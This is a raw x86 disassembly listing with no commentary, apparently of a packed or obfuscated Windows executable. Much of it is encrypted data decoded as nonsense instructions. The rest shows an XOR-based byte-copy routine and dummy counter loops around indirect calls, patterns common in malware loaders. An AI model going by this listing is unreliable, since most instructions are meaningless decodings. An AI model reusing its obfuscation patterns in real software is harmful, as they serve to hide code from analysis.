  402933:	mov    BYTE PTR [ecx+0x1],al
  402936:	adc    esp,DWORD PTR ds:0xa4965a2
  40293c:	sahf   
  40293d:	mov    eax,edi
  40293f:	fimul  DWORD PTR [eax+0x47]
  402942:	retf   0x16f3
  402945:	jmp    0x402922
  402947:	push   ss
  402948:	or     dl,cl
  40294a:	in     eax,dx
  40294b:	push   0xa2c8b213
  402950:	cwde   
  402951:	sub    al,0x38
  402953:	fdivr  st,st(1)
  402955:	pop    ebp
  402956:	enter  0x2fd,0x1d
  40295a:	sub    BYTE PTR [edi+0x65],bl
  40295d:	pop    esi
  40295e:	xlat   BYTE PTR ds:[ebx]
  40295f:	mov    al,0x69
  402961:	xchg   edx,eax
  402962:	xor    DWORD PTR [ebp+esi*8+0x48],0xfcd84891
  40296a:	cld    
  40296b:	add    BYTE PTR [ecx],ch
  40296d:	aam    0xee
  40296f:	cmp    al,0xb8
  402971:	mov    bl,0x7e
  402973:	sbb    al,BYTE PTR [esi]
  402975:	retf   
  402976:	je     0x40298a
  402978:	jmp    0x40294d
  40297a:	mov    gs,WORD PTR [esi]
  40297c:	cs and eax,0x4a7d589a
  402982:	pop    edi
  402983:	inc    edx
  402984:	inc    ebp
  402985:	aad    0x7b
  402987:	fnstsw WORD PTR [edx]
  402989:	push   edx
  40298a:	fldcw  WORD PTR [edi+0x47]
  40298d:	inc    edx
  40298e:	mov    al,0xf5
  402990:	addr16 out 0x7b,eax
  402993:	cmc    
  402994:	sbb    BYTE PTR [eax],dh
  402996:	clc    
  402997:	dec    edx
  402998:	add    BYTE PTR ds:0x308a8a,ch
  40299e:	rol    BYTE PTR ss:[ecx+0x449a08ab],cl
  4029a5:	cmc    
  4029a6:	int    0x11
  4029a8:	cmp    ecx,DWORD PTR [eax]
  4029aa:	add    DWORD PTR [ebp+0xdd6237e],0xae12c516
  4029b4:	push   esp
  4029b5:	jl     0x4029de
  4029b7:	ins    DWORD PTR es:[edi],dx
  4029b8:	loope  0x402a1e
  4029ba:	ins    BYTE PTR es:[edi],dx
  4029bb:	push   ecx
  4029bc:	mov    bh,0x0
  4029be:	mov    ch,0x2a
  4029c0:	jne    0x4029e8
  4029c2:	shl    DWORD PTR [ebx],0x33
  4029c5:	pop    ds
  4029c6:	loope  0x402960
  4029c8:	push   es
  4029c9:	fsubr  QWORD PTR [ecx+ecx*8+0x33]
  4029cd:	ret    
  4029ce:	das    
  4029cf:	fst    DWORD PTR [edx+0x3b6f6c97]
  4029d5:	xor    eax,DWORD PTR [edi]
  4029d7:	cmp    al,0x95
  4029d9:	pop    ds
  4029da:	inc    edi
  4029db:	lea    ebp,[eax]
  4029dd:	push   ebx
  4029de:	inc    edx
  4029df:	xor    DWORD PTR [edi+eax*8+0x38af162],ebx
  4029e6:	fdiv   QWORD PTR [eax+0x55]
  4029e9:	and    DWORD PTR [ecx-0x50],0x7830656c
  4029f0:	add    al,0x99
  4029f2:	test   eax,0xae987ed9
  4029f7:	call   0x602ba751
  4029fc:	std    
  4029fd:	or     cl,BYTE PTR [ecx]
  4029ff:	sbb    eax,0x4a843988
  402a04:	and    edi,DWORD PTR [eax]
  402a06:	add    esp,DWORD PTR [ecx-0x65]
  402a09:	push   ds
  402a0a:	loope  0x4029af
  402a0c:	mov    ch,0x28
  402a0e:	add    edi,DWORD PTR [ebp+0x10]
  402a11:	xor    edx,ecx
  402a13:	add    edx,esi
  402a15:	cmp    edx,edi
  402a17:	ja     0x402e5d
  402a1d:	push   ebx
  402a1e:	jmp    0x402a28
  402a23:	mov    esi,0x32729b
  402a28:	mov    eax,DWORD PTR [ebp-0x8]
  402a2b:	mov    edi,DWORD PTR [ebp-0x4]
  402a2e:	jmp    0x402c26
  402a33:	lock ss inc eax
  402a36:	xor    al,0x40
  402a38:	jo     0x402aaa
  402a3a:	repnz push ss
  402a3c:	pop    ds
  402a3d:	mov    ds:0x54902380,al
  402a42:	cmp    BYTE PTR [eax+0xc],ch
  402a45:	jle    0x402ac5
  402a47:	push   ebp
  402a48:	jg     0x402ac8
  402a4a:	jle    0x4029ed
  402a4c:	out    0x3f,al
  402a4e:	mov    al,0xad
  402a50:	mov    bh,0x18
  402a52:	leave  
  402a53:	outs   dx,BYTE PTR ds:[esi]
  402a54:	or     eax,0x88543fe0
  402a59:	or     DWORD PTR [ebx],ebx
  402a5b:	fisubr DWORD PTR [edi]
  402a5d:	ins    DWORD PTR es:[edi],dx
  402a5e:	jp     0x402a08
  402a60:	sbb    dl,BYTE PTR [ebp+0x7e]
  402a63:	xor    BYTE PTR [edx],0xc
  402a66:	sbb    al,0x23
  402a68:	sub    dh,BYTE PTR [edx+0x2a]
  402a6b:	add    eax,0x55454154
  402a70:	or     eax,0x2f0f99c4
  402a75:	ret    
  402a76:	inc    eax
  402a77:	pop    edi
  402a78:	adc    BYTE PTR [eax],dl
  402a7a:	add    cl,BYTE PTR [edi]
  402a7c:	inc    eax
  402a7d:	cld    
  402a7e:	xchg   ebx,eax
  402a7f:	mov    dl,0x17
  402a81:	sbb    eax,DWORD PTR [edi-0x79]
  402a84:	jmp    0xc7f87b91
  402a89:	(bad)  
  402a8a:	fld    TBYTE PTR [edx+0x674737a0]
  402a90:	xchg   ebx,eax
  402a91:	(bad)  
  402a92:	lods   eax,DWORD PTR ds:[esi]
  402a93:	pop    edi
  402a94:	adc    esp,DWORD PTR ds:0x8e03cdd2
  402a9a:	ins    DWORD PTR es:[edi],dx
  402a9b:	into   
  402a9c:	data16 adc BYTE PTR [ebp-0x6b],bh
  402aa0:	leave  
  402aa1:	pop    ss
  402aa2:	adc    DWORD PTR [edx-0x59c58735],ebx
  402aa8:	sub    DWORD PTR [edi],0x20
  402aab:	mov    DWORD PTR [ecx],0x94f70153
  402ab1:	add    eax,0xcd3e15f1
  402ab6:	jne    0x402a5c
  402ab8:	je     0x402b18
  402aba:	push   ecx
  402abb:	(bad)  gs:[esp+edi*8-0x5]
  402ac0:	or     al,0x83
  402ac2:	popf   
  402ac3:	pushf  
  402ac4:	pop    esi
  402ac5:	push   ss
  402ac6:	stos   DWORD PTR es:[edi],eax
  402ac7:	sahf   
  402ac8:	fwait
  402ac9:	gs ja  0x402a70
  402acc:	fstp   QWORD PTR [edx+0x7fd44195]
  402ad2:	mov    eax,ds:0x539d21e1
  402ad7:	das    
  402ad8:	and    esi,DWORD PTR [ebx+0xe]
  402adb:	sub    eax,0x6ec9ade
  402ae0:	mov    dh,ch
  402ae2:	repnz mov esi,0x6f4ba5f4
  402ae8:	imul   esp,DWORD PTR ss:[eax+ecx*2],0x4a
  402aed:	bound  edx,QWORD PTR [ecx-0x9]
  402af0:	test   eax,edx
  402af2:	jno    0x402afc
  402af4:	sub    BYTE PTR ds:0xa72fb475,cl
  402afa:	fisubr DWORD PTR [ebx-0x50]
  402afd:	repz pop ds
  402aff:	mov    esp,0xa42600b
  402b04:	and    BYTE PTR ds:0xeae8b56d,cl
  402b0a:	jp     0x402ae1
  402b0c:	fst    QWORD PTR [esi-0x73e04cc4]
  402b12:	dec    edi
  402b13:	dec    ebx
  402b14:	cwde   
  402b15:	or     eax,DWORD PTR [esi]
  402b17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b18:	popa   
  402b19:	in     al,dx
  402b1a:	mov    DWORD PTR [edi+eiz*4],0x53fa2722
  402b21:	jae    0x402b82
  402b23:	xlat   BYTE PTR ds:[ebx]
  402b24:	lods   al,BYTE PTR ds:[esi]
  402b25:	daa    
  402b26:	jne    0x402b09
  402b28:	xor    al,0x9
  402b2a:	pop    eax
  402b2b:	(bad)  
  402b2c:	call   0x6ae0:0x2a42b0e2
  402b33:	outs   dx,BYTE PTR ds:[esi]
  402b34:	ja     0x402b49
  402b36:	inc    edx
  402b37:	rol    DWORD PTR [ebp+0x2c7ef84],cl
  402b3d:	jecxz  0x402b93
  402b3f:	or     BYTE PTR [ebx],bh
  402b41:	dec    ecx
  402b42:	xchg   edx,eax
  402b43:	cmp    BYTE PTR [ebx+eax*2-0x29],bh
  402b47:	or     eax,0xf4ac11b4
  402b4c:	sbb    edx,DWORD PTR [eax+0x77]
  402b4f:	sub    BYTE PTR ss:[edx-0x3702bc84],cl
  402b56:	mov    eax,ds:0x2bc01ffa
  402b5b:	xor    ah,dl
  402b5d:	sub    esp,DWORD PTR [edi+ecx*2+0x3f]
  402b61:	in     al,0xcb
  402b63:	int3   
  402b64:	fld    TBYTE PTR [esi+ebp*2]
  402b67:	sti    
  402b68:	or     eax,0xf2655bfe
  402b6d:	inc    esi
  402b6e:	sub    eax,DWORD PTR [ecx]
  402b70:	call   0x33ce:0x3b59d0e0
  402b77:	cs in  al,dx
  402b79:	in     al,0xe5
  402b7b:	out    dx,eax
  402b7c:	sub    al,0x5f
  402b7e:	jg     0x402b09
  402b80:	fild   DWORD PTR [eax]
  402b82:	in     al,dx
  402b83:	jge    0x402be0
  402b85:	retf   0x3afe
  402b88:	pop    es
  402b89:	out    dx,al
  402b8a:	icebp  
  402b8b:	mov    eax,0xed3d9c20
  402b90:	and    eax,0xbaf6e0d3
  402b95:	int3   
  402b96:	in     eax,dx
  402b97:	push   DWORD PTR [esi+0x6b]
  402b9a:	pop    ecx
  402b9b:	std    
  402b9c:	call   DWORD PTR [edx-0x59]
  402b9f:	xchg   ebx,eax
  402ba0:	push   eax
  402ba1:	and    DWORD PTR [ebx+0x42591c36],edx
  402ba7:	jbe    0x402b42
  402ba9:	push   ebp
  402baa:	or     BYTE PTR [edx+0x6382f71b],bl
  402bb0:	fwait
  402bb1:	mov    eax,0xdc28dccc
  402bb6:	pop    esi
  402bb7:	mov    edi,0x5c3a5fe7
  402bbc:	push   ecx
  402bbd:	mov    eax,0x302db18e
  402bc2:	mov    dh,0x72
  402bc4:	jb     0x402c0a
  402bc6:	push   edx
  402bc7:	sub    eax,0xf4c8dda6
  402bcc:	loope  0x402bda
  402bce:	xor    ebp,eax
  402bd0:	inc    DWORD PTR [edx]
  402bd2:	mov    ah,0xdd
  402bd4:	fst    QWORD PTR ds:0x23d80e15
  402bda:	add    BYTE PTR [eax+edi*4],cl
  402bdd:	or     al,0x53
  402bdf:	enter  0x33,0x8d
  402be3:	stos   BYTE PTR es:[edi],al
  402be4:	jp     0x402bbb
  402be6:	and    bl,BYTE PTR [ebx+0x7fe9225e]
  402bec:	es jae 0x402c3a
  402bef:	call   edi
  402bf1:	push   ds
  402bf2:	add    eax,0x208e7a69
  402bf7:	jno    0x402bc3
  402bf9:	fmul   QWORD PTR ds:0xeb094614
  402bff:	popa   
  402c00:	adc    al,0xa3
  402c02:	cdq    
  402c03:	dec    edx
  402c05:	and    edi,ebx
  402c07:	cmp    bl,bh
  402c09:	js     0x402c35
  402c0b:	mov    ebx,0x6477c4e4
  402c10:	int3   
  402c11:	sub    BYTE PTR [ebx+0x31],ch
  402c14:	call   0x82227998
  402c19:	cmp    ecx,DWORD PTR [ebp+0x7013d1bc]
  402c1f:	scas   al,BYTE PTR es:[edi]
  402c20:	adc    al,0x5a
  402c22:	and    bh,BYTE PTR [ebp+0x29]
  402c25:	shl    BYTE PTR [ebx],0xf9
  402c28:	add    edi,esi
  402c2a:	mov    esi,DWORD PTR [ebp+0x8]
  402c2d:	imul   edi,edx
  402c30:	mov    ebx,DWORD PTR [ebp+0xc]
  402c33:	xor    eax,ecx
  402c35:	add    eax,edx
  402c37:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  402c3e:	mov    BYTE PTR [edi+esi*1],al
  402c41:	mov    eax,DWORD PTR [ebp-0x4]
  402c44:	xor    eax,ecx
  402c46:	lea    edx,[edx+eax*1+0x32729b]
  402c4d:	mov    eax,DWORD PTR [ebp-0x4]
  402c50:	xor    eax,ecx
  402c52:	mov    esi,0xffcd8d65
  402c57:	sub    esi,eax
  402c59:	jmp    0x402e51
  402c5e:	outs   dx,BYTE PTR ds:[esi]
  402c5f:	add    ebx,DWORD PTR [edi+0x6f72734e]
  402c65:	and    ebp,DWORD PTR [esi]
  402c67:	add    al,0x68
  402c69:	mov    dh,0xce
  402c6b:	ret    0x27e4
  402c6e:	dec    edi
  402c6f:	or     bh,BYTE PTR [esi+0x7e]
  402c72:	push   ebp
  402c73:	jg     0x402cf3
  402c75:	jle    0x402c5f
  402c77:	cmp    ch,BYTE PTR [ebx]
  402c79:	or     al,0x8
  402c7b:	adc    edi,DWORD PTR [edi-0x722982d3]
  402c81:	mov    dl,BYTE PTR [ebp-0x44]
  402c84:	rcr    DWORD PTR [esi+0x49],cl
  402c87:	and    eax,0xc42e7d71
  402c8c:	mov    al,ds:0xf38e492e
  402c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c92:	xchg   DWORD PTR [edx-0x62d11ba1],eax
  402c98:	mov    dh,0xb4
  402c9a:	push   eax
  402c9b:	fsub   QWORD PTR ds:0xea1ac2c7
  402ca1:	mov    edi,0x9f646a3
  402ca6:	mov    edi,0x6ecef66
  402cab:	dec    esp
  402cac:	rol    al,cl
  402cae:	cmp    ah,BYTE PTR ss:[edi-0x6c]
  402cb2:	mov    bh,0x3f
  402cb4:	lods   al,BYTE PTR ds:[esi]
  402cb5:	out    0x10,eax
  402cb7:	adc    eax,0xd521afd7
  402cbc:	cmp    BYTE PTR [ebp+0x2b],dh
  402cbf:	cdq    
  402cc0:	scas   al,BYTE PTR es:[edi]
  402cc1:	inc    eax
  402cc2:	lds    edi,FWORD PTR [eax+0x5a4619ca]
  402cc8:	addr16 enter 0xf40b,0xc7
  402ccd:	cmp    eax,0xc03ccc25
  402cd2:	and    eax,0xc2fe47d8
  402cd7:	cmp    DWORD PTR ds:0x48100c36,edx
  402cdd:	fs cmp eax,0x2ff34b23
  402ce3:	cmp    eax,0x9c52908e
  402ce8:	mov    WORD PTR [edi-0x2b],?
  402ceb:	pop    ecx
  402cec:	les    edi,FWORD PTR [edi+0x20]
  402cef:	sbb    eax,0xff63255a
  402cf4:	stos   DWORD PTR es:[edi],eax
  402cf5:	pushf  
  402cf6:	mov    ah,0xa6
  402cf8:	jno    0x402cb2
  402cfa:	add    eax,0x7974269a
  402cff:	js     0x402cc9
  402d01:	and    DWORD PTR [ebp+edx*2-0x21],eax
  402d05:	push   ecx
  402d06:	push   cs
  402d07:	stos   BYTE PTR es:[edi],al
  402d08:	mov    esp,0x604464cb
  402d0d:	push   esi
  402d0e:	lahf   
  402d0f:	adc    ch,0xcb
  402d12:	int    0x84
  402d14:	jb     0x402d46
  402d16:	lock nop
  402d18:	in     eax,0x4a
  402d1a:	dec    esi
  402d1b:	mov    ecx,0x1f99c1ea
  402d20:	ins    BYTE PTR es:[edi],dx
  402d21:	stos   DWORD PTR es:[edi],eax
  402d22:	sub    BYTE PTR [edx+0x7944ee83],dl
  402d28:	lods   al,BYTE PTR ds:[esi]
  402d29:	xchg   DWORD PTR [edx+0x20],ebx
  402d2c:	xor    DWORD PTR [ebx+edx*2],eax
  402d2f:	cli    
  402d30:	or     eax,DWORD PTR [eax-0x13]
  402d33:	mov    ah,0xf0
  402d35:	lods   eax,DWORD PTR ds:[esi]
  402d36:	and    esi,DWORD PTR [edx+0x68]
  402d39:	push   ebx
  402d3a:	inc    ebp
  402d3b:	inc    ebx
  402d3c:	push   edi
  402d3d:	or     DWORD PTR [edi],ebx
  402d3f:	scas   eax,DWORD PTR es:[edi]
  402d40:	cli    
  402d41:	sub    al,0x1
  402d43:	out    dx,al
  402d44:	fistp  QWORD PTR [edx]
  402d46:	xchg   ecx,eax
  402d47:	xor    eax,0xaf25992b
  402d4c:	jb     0x402d6f
  402d4e:	xor    ebx,DWORD PTR [ecx-0x21]
  402d51:	push   edi
  402d52:	mov    edx,0x6cd2c272
  402d57:	push   ds
  402d58:	fadd   DWORD PTR [ebx-0x3068d3fd]
  402d5e:	dec    esi
  402d5f:	mov    DWORD PTR [edi],esp
  402d61:	ss pop ss
  402d63:	sahf   
  402d64:	fldcw  WORD PTR fs:[edx-0x606fc449]
  402d6b:	inc    edx
  402d6c:	cmp    ch,al
  402d6e:	adc    DWORD PTR [ebx+0x65],0x6e
  402d72:	imul   ebx,DWORD PTR [edx-0x7ef758ab],0xffffff9c
  402d79:	mov    ds,WORD PTR [edi]
  402d7b:	or     eax,0x3527004b
  402d80:	jle    0x402d80
  402d82:	daa    
  402d83:	mov    al,ds:0xdbeb3aa7
  402d88:	sahf   
  402d89:	sub    dl,dh
  402d8b:	retf   0x754b
  402d8e:	push   cs
  402d8f:	prefetcht1 BYTE PTR [ebp+edx*1+0x39ca63a2]
  402d97:	loopne 0x402d50
  402d99:	mov    es,WORD PTR ds:0xd9dd42f7
  402d9f:	add    eax,edx
  402da1:	stos   BYTE PTR es:[edi],al
  402da2:	fs and al,0x70
  402da5:	jo     0x402d2b
  402da7:	es mov ebp,0x97b99331
  402dad:	jle    0x402db2
  402daf:	call   0xfce2:0x5389f2ce
  402db6:	mov    ch,0xbf
  402db8:	jae    0x402ddf
  402dba:	leave  
  402dbb:	call   DWORD PTR [edi-0x63b12a09]
  402dc1:	xor    al,0x8b
  402dc3:	not    BYTE PTR [edx+0x4eb070af]
  402dc9:	or     dl,BYTE PTR [ebp+0x3a2ed9a0]
  402dcf:	xchg   esp,eax
  402dd0:	mov    eax,0xfea4c9bb
  402dd5:	pop    ebp
  402dd6:	and    eax,0xdd490041
  402ddb:	or     eax,0x477f0e4b
  402de0:	push   esp
  402de1:	mov    esp,0x36422d98
  402de6:	jno    0x402de5
  402de8:	jns    0x402e1a
  402dea:	dec    edx
  402deb:	leave  
  402dec:	dec    ebp
  402ded:	sahf   
  402dee:	pop    ds
  402def:	loop   0x402e1c
  402df1:	jns    0x402da0
  402df3:	xchg   BYTE PTR [ebx+0x33018fcf],ch
  402df9:	jle    0x402e2c
  402dfb:	cmp    eax,0x1ce1d0c
  402e00:	iret   
  402e01:	push   cs
  402e02:	ret    
  402e03:	ins    BYTE PTR es:[edi],dx
  402e04:	xor    BYTE PTR [ebx+edx*2],bl
  402e07:	sbb    cl,BYTE PTR [eax+esi*4-0x2d]
  402e0b:	mov    esi,0x2a4c7225
  402e10:	inc    ecx
  402e11:	syscall 
  402e13:	sub    ebp,esi
  402e15:	lods   eax,DWORD PTR ds:[esi]
  402e16:	xchg   ebx,eax
  402e17:	xchg   edi,eax
  402e18:	push   eax
  402e19:	out    0xbf,eax
  402e1b:	mov    al,ds:0x88300f11
  402e20:	pop    esi
  402e21:	pushf  
  402e22:	in     eax,0xc9
  402e24:	pop    edi
  402e25:	dec    edx
  402e26:	outs   dx,DWORD PTR ds:[esi]
  402e27:	in     eax,dx
  402e28:	repnz imul edx,DWORD PTR [ebp-0x33],0xdc20f67b
  402e30:	iret   
  402e31:	ja     0x402e60
  402e33:	jge    0x402e26
  402e35:	test   edx,ecx
  402e37:	loop   0x402e5d
  402e39:	mov    ebx,0x2719f2b9
  402e3e:	test   BYTE PTR [ebx],bh
  402e40:	sub    BYTE PTR [ebx],ah
  402e42:	push   edx
  402e43:	fbld   TBYTE PTR cs:[esi]
  402e46:	sub    dh,BYTE PTR [ebx+0x15]
  402e49:	jmp    0x32f5:0xaf1cda29
  402e50:	fiadd  DWORD PTR [ebx]
  402e52:	jne    0x402e64
  402e54:	cmp    edx,esi
  402e56:	jbe    0x402a23
  402e5c:	pop    ebx
  402e5d:	mov    eax,0xf89c8532
  402e62:	pop    edi
  402e63:	pop    esi
  402e64:	leave  
  402e65:	ret    0xc
  402e68:	push   ebp
  402e69:	mov    ebp,esp
  402e6b:	sub    esp,0x58
  402e6e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e71:	mov    eax,0x8a3c
  402e76:	xor    ax,WORD PTR [ecx+0x20]
  402e7a:	mov    ecx,0x3b02
  402e7f:	add    ax,cx
  402e82:	or     DWORD PTR ds:0x42e650,edi
  402e88:	movzx  eax,ax
  402e8b:	mov    ecx,DWORD PTR ds:0x4302b5
  402e91:	xor    ecx,DWORD PTR ds:0x42ec53
  402e97:	mov    DWORD PTR ds:0x4302b5,ecx
  402e9d:	mov    DWORD PTR [ebp-0xc],eax
  402ea0:	mov    BYTE PTR [ebp-0x1],0x7f
  402ea4:	sub    ecx,0x18d2
  402eaa:	lea    eax,[ebp-0x1]
  402ead:	and    DWORD PTR ds:0x42ec6f,0x0
  402eb7:	jmp    0x402ec9
  402ebc:	mov    ecx,DWORD PTR ds:0x42ec6f
  402ec2:	inc    ecx
  402ec3:	mov    DWORD PTR ds:0x42ec6f,ecx
  402ec9:	cmp    DWORD PTR ds:0x42ec6f,0x18
  402ed0:	jae    0x402fa2
  402ed6:	cmp    DWORD PTR ds:0x42ec6f,0x1a
  402edd:	jne    0x402eee
  402ee3:	push   0x2d42
  402ee8:	call   DWORD PTR ds:0x42e91b
  402eee:	jmp    0x402ebc
  402ef3:	mov    DWORD PTR ds:0x42ec67,0x17
  402efd:	cmp    DWORD PTR ds:0x42ec67,0x0
  402f04:	je     0x402fa2
  402f0a:	cmp    DWORD PTR ds:0x42ec67,0x7
  402f11:	jne    0x402f2c
  402f17:	push   0x25f8
  402f1c:	push   0x4302c9
  402f21:	push   0x42e737
  402f26:	call   DWORD PTR ds:0x42e833
  402f2c:	cmp    DWORD PTR ds:0x42ec67,0x8
  402f33:	jne    0x402f48
  402f39:	xor    ecx,ecx
  402f3b:	or     ecx,DWORD PTR ds:0x42ec67
  402f41:	dec    ecx
  402f42:	mov    DWORD PTR ds:0x42ec67,ecx
  402f48:	mov    ecx,DWORD PTR ds:0x42ec67
  402f4e:	dec    ecx
  402f4f:	mov    DWORD PTR ds:0x42ec67,ecx
  402f55:	jmp    0x402efd
  402f5a:	and    DWORD PTR ds:0x42ec4f,0x0
  402f64:	mov    ecx,DWORD PTR ds:0x42ec4f
  402f6a:	inc    ecx
  402f6b:	mov    DWORD PTR ds:0x42ec4f,ecx
  402f71:	cmp    DWORD PTR ds:0x42ec4f,0x16
  402f78:	jne    0x402f8f
  402f7e:	push   DWORD PTR [ebp-0xc]
  402f81:	push   0x4302ed
  402f86:	push   DWORD PTR [ebp-0x24]
  402f89:	call   DWORD PTR ds:0x42e847
  402f8f:	cmp    DWORD PTR ds:0x42ec4f,0x10
  402f96:	jb     0x402f64
  402f9c:	add    DWORD PTR ds:0x42ec4b,ebx
  402fa2:	mov    DWORD PTR [ebp-0x10],eax
  402fa5:	mov    DWORD PTR ds:0x4302d5,0x10
  402faf:	cmp    DWORD PTR ds:0x4302d5,0x0
  402fb6:	je     0x403010
  402fbc:	cmp    DWORD PTR ds:0x4302d5,0x4
  402fc3:	jne    0x402fda
  402fc9:	push   DWORD PTR [ebp-0x1c]
  402fcc:	push   DWORD PTR [ebp-0x20]
  402fcf:	push   0x42e6ad
  402fd4:	call   DWORD PTR ds:0x42e84b
  402fda:	cmp    DWORD PTR ds:0x4302d5,0x5
  402fe1:	jne    0x402ff4
  402fe7:	mov    ecx,DWORD PTR ds:0x4302d5
  402fed:	dec    ecx
  402fee:	mov    DWORD PTR ds:0x4302d5,ecx
  402ff4:	mov    ecx,DWORD PTR ds:0x4302d5
  402ffa:	dec    ecx
  402ffb:	mov    DWORD PTR ds:0x4302d5,ecx
  403001:	jmp    0x402faf
  403006:	and    DWORD PTR ds:0x4302ed,0x3a0f
  403010:	mov    al,BYTE PTR [ebp-0x1]
  403013:	mov    ecx,DWORD PTR ds:0x42e640
  403019:	add    DWORD PTR ds:0x42ec73,ecx
  40301f:	mov    ecx,DWORD PTR [ebp-0x10]
  403022:	mov    DWORD PTR ds:0x43035b,0x1b71
  40302c:	xor    al,0x46
  40302e:	sub    al,0x38
  403030:	or     DWORD PTR ds:0x42e648,0x7677
  40303a:	mov    BYTE PTR [ecx],al
  40303c:	not    eax
  40303e:	jmp    0x40320b
  403043:	loop   0x40305e
  403045:	fcom   DWORD PTR [ebp+0x697355e1]
  40304b:	popf   
  40304c:	mov    DWORD PTR [ecx-0x48],ebp
  40304f:	pop    esp
  403050:	mov    bl,0xb0
  403052:	mov    edx,0x7e7e08a2
  403057:	scas   al,BYTE PTR es:[edi]
  403058:	jg     0x4030d8
  40305a:	jle    0x40303c
  40305c:	(bad)  
  40305d:	fisttp DWORD PTR [eax+0x69]
  403060:	push   esi
  403061:	imul   ebp,DWORD PTR [ebx+0x26],0x91527f6d
  403068:	rcl    BYTE PTR [esi-0x7d6f76d6],0x1d
  40306f:	xor    BYTE PTR [ecx+0x2079d5cc],dh
  403075:	sub    edx,DWORD PTR [ebx-0x19]
  403078:	jbe    0x403031
  40307a:	les    eax,FWORD PTR [ebx]
  40307c:	(bad)  
  40307d:	jns    0x40303e
  40307f:	push   ds
  403080:	cmp    DWORD PTR [ecx+0x7c],0xffffffe3
  403084:	aas    
  403085:	shr    ah,cl
  403087:	jne    0x4030b9
  403089:	out    0x79,eax
  40308b:	dec    edx
  40308c:	jmp    0xf6ac3429
  403091:	or     eax,0x9e5d5c6c
  403096:	pop    edi
  403097:	and    DWORD PTR [esi],esp
  403099:	fld    TBYTE PTR [ebx-0x16]
  40309c:	call   0xf663:0x3c1390cb
  4030a3:	sub    bl,dh
  4030a5:	or     BYTE PTR [edx],dl
  4030a7:	push   ds
  4030a8:	sbb    eax,0x22ce7ebc
  4030ad:	push   ds
  4030ae:	jnp    0x403044
  4030b0:	xor    BYTE PTR [edi+edx*8],ch
  4030b3:	bound  ebp,QWORD PTR [edx+0x6c]
  4030b6:	sbb    al,0x75
  4030b8:	mov    dh,0x4b
  4030ba:	sub    DWORD PTR [edi-0x21],edi
  4030bd:	adc    DWORD PTR [edi+0x6c],esp
  4030c0:	and    ebx,DWORD PTR [ebx+eiz*4]
  4030c3:	imul   esi,ecx,0x11
  4030c6:	ja     0x40310e
  4030c8:	pop    ecx
  4030c9:	or     ebx,DWORD PTR [esi+0x1165dbbc]
  4030cf:	xor    al,al
  4030d1:	mov    ebp,ecx
  4030d3:	into   
  4030d4:	das    
  4030d5:	ret    0x7727
  4030d8:	fld    DWORD PTR ds:0xf6434963
  4030de:	shr    BYTE PTR [edx+0x3c66c095],1
  4030e4:	xor    eax,0xfe2827e1
  4030e9:	sub    ecx,edx
  4030eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030ec:	aad    0x64
  4030ee:	rcr    esp,0x21
  4030f1:	stos   DWORD PTR es:[edi],eax
  4030f2:	cmp    DWORD PTR [edx+eiz*4],esi
  4030f5:	push   ebp
  4030f6:	nop
  4030f7:	sti    
  4030f8:	jmp    0xdd5084ff
  4030fd:	push   ebp
  4030fe:	nop
  4030ff:	push   ds
  403100:	fidiv  DWORD PTR [ebp-0x41c7e2a3]
  403106:	(bad)  [esi-0x62]
  403109:	ja     0x403091
  40310b:	loop   0x4030fa
  40310d:	mov    eax,ds:0x61520d88
  403112:	and    al,0x6e
  403114:	stos   DWORD PTR es:[edi],eax
  403115:	(bad)  
  403116:	in     al,0xe5
  403118:	or     BYTE PTR [eax-0x66],0x99
  40311c:	test   eax,0x73535b27
  403121:	shr    al,0x54
  403124:	cdq    
  403125:	cli    
  403126:	mov    esi,0x65ed2aae
  40312b:	jo     0x403109
  40312d:	jmp    0x4031ae
  40312f:	cmp    eax,0x4791b2b8
  403134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403135:	fiadd  WORD PTR [edx+0x4cc3daa9]
  40313b:	lods   eax,DWORD PTR ds:[esi]
  40313c:	fcom   QWORD PTR [eax+esi*4+0x31]
  403140:	icebp  
  403141:	push   0x74
  403143:	and    BYTE PTR [ebx+eax*1-0x4601a0ba],0x6b
  40314b:	(bad)
  40314e:	popa   
  40314f:	out    0x24,al
  403151:	add    bl,dh
  403153:	cwde   
  403154:	aam    0x5d
  403156:	push   ss
  403157:	sbb    eax,0x17f03dd1
  40315c:	inc    esp
  40315d:	lods   al,BYTE PTR ds:[esi]
  40315e:	jecxz  0x4031de
  403160:	push   0xb3d92dee
  403165:	mov    eax,ds:0x6781de7a
  40316a:	fcomp  DWORD PTR [ebp+0x588d0839]
  403170:	jno    0x403122
  403172:	cmp    dh,BYTE PTR [edx+0x46]
  403175:	mov    ds,ebp
  403177:	into   
  403178:	push   0xffffffac
  40317a:	dec    esi
  40317b:	loopne 0x40315f
  40317d:	aaa    
  40317e:	call   0x1dc:0xa55fe3cc
  403185:	inc    edi
  403186:	ficomp WORD PTR [eax+0x4]
  403189:	push   eax
  40318a:	rcr    BYTE PTR [edx],0x4d
  40318d:	xor    dl,BYTE PTR [esi+eiz*4-0x41dd9540]
  403194:	pop    esp
  403195:	pop    esp
  403196:	dec    edx
  403197:	lods   al,BYTE PTR ds:[esi]
  403198:	or     al,0xc7
  40319a:	xlat   BYTE PTR ds:[ebx]
  40319b:	jl     0x40315c
  40319d:	imul   eax,DWORD PTR [ebp+edx*8-0x2d024c8c],0x28
  4031a5:	hlt    
  4031a6:	adc    BYTE PTR [edx-0x70],0x86
  4031aa:	in     al,dx
  4031ab:	iret   
  4031ac:	sub    BYTE PTR [esi+edx*4-0x12d18022],0xb7
  4031b4:	fsub   DWORD PTR [edi-0x3e]
  4031b7:	into   
  4031b8:	lods   al,BYTE PTR ds:[esi]
  4031b9:	xchg   edi,eax
  4031ba:	cmc    
  4031bb:	xor    bh,BYTE PTR [edi-0x1a]
  4031be:	jae    0x4031fa
  4031c0:	push   0xc798278d
  4031c5:	ins    BYTE PTR es:[edi],dx
  4031c6:	lahf   
  4031c7:	dec    edi
  4031c8:	mov    bl,0x63
  4031ca:	sbb    DWORD PTR [edi+edi*2],ebx
  4031cd:	aaa    
  4031ce:	and    DWORD PTR [bp+di-0xa],esi
  4031d2:	clc    
  4031d3:	xchg   ebx,eax
  4031d4:	ins    DWORD PTR es:[edi],dx
  4031d5:	pop    es
  4031d6:	je     0x4031e3
